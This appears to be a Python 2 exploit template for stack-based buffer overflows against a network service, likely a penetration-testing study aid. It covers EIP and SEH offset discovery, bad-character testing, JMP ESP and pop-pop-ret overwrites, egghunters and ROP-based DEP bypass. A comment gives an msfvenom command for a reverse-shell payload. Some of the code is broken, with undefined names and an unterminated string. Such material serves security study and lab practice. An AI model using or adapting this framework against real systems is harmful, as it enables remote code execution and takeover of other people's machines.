#!/usr/bin/python2

import sys, socket, os, struct

# GLOBAL VARS --> IP + SERVICE PORT + NOPS
IP = '127.0.0.1'
port = 31337
NOPS = "\x90" * 16

#-----------------1 - BYTE CRASH + GET EIP ADDRESS + CONTROL TEST + CHECK SEH --> EVIL_BUFFER = crash + pattern + eip_control--------------#
byte_crash = 1000
crash = "A"*byte_crash
pattern = str(os.popen("msf-pattern_create -l " + str(byte_crash)).read())

eip_crash = "39654138"  # <-- Write EIP address here
offset = int(os.popen("msf-pattern_offset -q " + str(eip_crash) + " | awk '{print $6}'").read())

eip_control = "A"*offset + "BBBB" + "C"*(byte_crash - offset - 4)

# If you can't control EIP --> Copy the SEH crash address: ALT + S
SEH_crash_address = 0x625010B4
SEH_offset = int(os.popen("msf-pattern_offset -q " + str(SEH_crash_address) + " | awk '{print $6}'").read())

# "!mona seh" to get the pop_pop_retn --> avoid bad characters
pop_pop_retn = 0x61617619

#----------------------------2 - BAD CHARACTERS TESTING --> EVIL_BUFFER = badchars---------------------#
# -> Automatic
# -> !mona cmp -a esp -f C:/badchars.bin
charset = ""

for i in range(0x00, 0xFF+1):
	if i not in badchars_lst:
		charset += chr(i)

with open ("~/.wine/drive_c/badchars.bin", "wb") as f:
	f.write(charset)

# -> Manual
# -> Set the four byte strings in the "badchars" string one at a time --> follow the ESP in dump --> add badchars to the list
bad_chars_1 = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
bad_chars_2 = "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
bad_chars_3 = "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf
bad_chars_4 = "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

badchars_lst = [0x00,0x0A,0x0D]

badchars = "A"*offset + "BBBB" + charset_OR_bad_chars

#--------------------------------3 - FIND THE JMP ESP ADDRESS + SEND STANDARD/SEH PAYLOAD--------------------------------#
# !mona jmp -r esp -cpb '\x00\x0a\x0d...badchars go here'
JMP_ESP = 0x080414c3

# msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=443 EXITFUNC=thread -f c -e x86/alpha_mixed -a x86 -b "\x00\x0a\x0d...badchars" AutoRunScript=post/windows/manage/migrate
payload = ("")
shellcode_std = "A" * offset + struct.pack("<I",JMP_ESP) + NOPS + payload
shellcode_SEH = "A"*(SEH_offset - 4) + "\xEB\x06\x90\x90" + struct.pack("<I",pop_pop_retn) + NOPS + payload

#---------------------------------4 - LIMITED SPACE BYPASS --> EGGHUNTING PAYLOAD---------------------------------#
# Generate egghunter: msf-egghunter -p windows -a x86 -f c -e b33f -b '\x00\x0a...badchars'
egghunter=("")

# Send stage1 first in another entry point, then stage2 in original input point --> double send_data()
egg_stage2 = "A"*(offset - len(egghunter) - len(NOPS)*2) + NOPS + egghunter + NOPS + struct.pack("<I",JMP_ESP) + "\xEB\xC4\x90\x90"
egg_stage1 = "b33fb33f" + payload

#---------------------------------5 - DEP BYPASS --> ROP GADGET PAYLOAD--------------------------------------#
# rop_chain --> !mona rop -m *.dll -n -cpb '\x00\x0a\x0d...badchars'
rop_chain = ""
shellcode_ROP = "A"*offset + rop_chain + NOPS + payload


# --> DATA SENDING FUNCTION
def send_data(IP,port,BUFFER):
	try:
		print "Sending data..."
        	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        	s.connect((IP,port))
	       	s.send(BUFFER + "\n")
		print "Finished sending data!"
        	s.close
	except:
        	print "Error connecting to the server"
        	sys.exit()

# --> SENDING THE BUFFER
EVIL_BUFFER = pattern
send_data(IP, port, EVIL_BUFFER)
